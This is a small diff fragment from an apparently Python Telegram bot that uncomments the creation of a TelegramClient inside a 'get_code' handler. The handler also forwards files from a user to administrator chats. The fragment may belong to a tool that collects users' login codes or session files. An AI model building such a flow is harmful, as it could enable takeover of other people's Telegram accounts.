@@ -98,7 +98,7 @@ async def get_code(message: types.Message):
         await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
         await client.log_out()
         await client.disconnect()
-        #client = TelegramClient('session_name', api_id, api_hash)
+        client = TelegramClient('session_name', api_id, api_hash)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
